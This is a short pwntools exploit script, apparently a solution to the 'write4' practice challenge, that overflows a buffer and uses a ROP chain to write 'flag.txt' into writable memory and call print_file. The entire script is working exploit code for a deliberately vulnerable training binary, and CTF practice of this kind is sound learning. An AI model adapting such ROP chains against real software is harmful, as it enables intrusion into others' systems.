from pwn import *

context.binary = ELF('./write4')

padding = b"a"*0x28

printf = 0x00400510 # imp.print_file (leak dari rabin2)

rdi_ret = 0x400693 #  pop rdi ; ret
pop_r14_r15 = 0x400690 # pop r14 ; pop r15 ; ret
mov_to_r14 = 0x400628 # mov qword ptr [r14], r15 ; ret

string_loc = 0x601038 # .bss section ,valid
string_loc2 = 0x601028 # .data section ,valid
string_loc3 = 0x4006b0 # .rodata section ,g valid

pay = flat(
    padding,
    
    pop_r14_r15, string_loc, b"flag.txt", mov_to_r14,

    rdi_ret, string_loc, printf
)

p = process("./write4")
p.sendline(pay)
p.interactive()
